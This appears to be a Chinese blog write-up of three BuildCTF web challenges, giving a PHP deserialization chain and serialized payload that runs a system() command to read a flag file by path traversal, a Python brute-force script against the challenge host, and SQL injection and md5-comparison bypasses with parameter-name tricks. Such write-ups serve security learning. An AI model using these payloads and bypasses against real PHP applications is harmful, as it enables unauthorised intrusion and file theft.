---
title: BuildCTF
date: 2024-10-18 19:45:18
tags: 复现
categories: 比赛复现
---

#### LovePopChain

简单的反序列化一枚

```
<?php
class MyObject{
    public $NoLove;
    public $Forgzy;

}

class GaoZhouYue{
    public $Yuer;
    public $LastOne;

}

class hybcx{
    public $JiuYue;
    public $Si;

}
$a=new MyObject();
$a->NoLove=new hybcx();
$a->NoLove->Si=new MyObject();

echo serialize($a);
```

注意的是，由于php版本的问题，传的参数应是No[Need.For.Love

```
?No[Need.For.Love=O:8:"MyObject":2:{s:6:"NoLove";O:5:"hybcx":2:{s:6:"JiuYue";N;s:2:"Si";O:8:"MyObject":2:{s:6:"NoLove";N;s:6:"Forgzy";N;}}s:6:"Forgzy";N;}

y3y4=system('cat ../../../ofl1111111111ove4g');
```



#### find-the-id

写个脚本爆破

```
import requests
url="http://27.25.151.80:39324/?g="
session=requests.Session()
for i in range(1,301):
    a=url+str(i)
    r=session.get(a)

    if "{" in r.text:
        print(r.text)

```

然后得到flag了



#### ez_md5

![image-20241020205408854](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410202054957.png)

password进行了md5加密

我们想到了两个特殊的md5

```
数字型：129581926211651571912466741651878684928
字符型：ffifdyop
```

他们都含有or结构，可以绕过sql注入

我们提交ffifdyop后得到了源码

```
<?php
error_reporting(0);
///robots
highlight_file(__FILE__);
include("flag.php");
$Build=$_GET['a'];
$CTF=$_GET['b'];
if($_REQUEST) { 
    foreach($_REQUEST as $value) { 
        if(preg_match('/[a-zA-Z]/i', $value))  
            die('不可以哦！'); 
    } 
}
if($Build != $CTF && md5($Build) == md5($CTF))
{
    if(md5($_POST['Build_CTF.com']) == "3e41f780146b6c246cd49dd296a3da28")
    {
        echo $flag;
    }else die("再想想");

}else die("不是吧这么简单的md5都过不去？");
?>
```

我们先了解一下$_REQUEST是什么东西

```
 $_REQUEST 变量包含了 $_GET、$_POST 和 $_COOKIE 的内容。
```

我们发现页面原本就有了回显

![image-20241020205742182](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410202057216.png)

我们猜测cookie含有字母，我们修改cookie为1，就绕过了正则匹配

然后第一个if是md5碰撞

我们用数组过滤了

```
?a[]=1&b[]=2
```

![image-20241020205922871](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410202059900.png)

然后我们需要md5($_POST['Build_CTF.com']) == "3e41f780146b6c246cd49dd296a3da28"）

页面还给了提示，我们查看robots.txt

![image-20241020210015156](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410202100184.png)

我们得到了部分要传的数据

我们进行爆破

```
<?php
for($a=1;$a<=10000000;$a++){
if(md5("114514".$a) == "3e41f780146b6c246cd49dd296a3da28"){
    echo "114514".$a;
    break;

    }

}
```

得到要传的数据

```
Build[CTF.com=1145146803531
```

由于php版本问题，Build_CTF.com的_要改为[
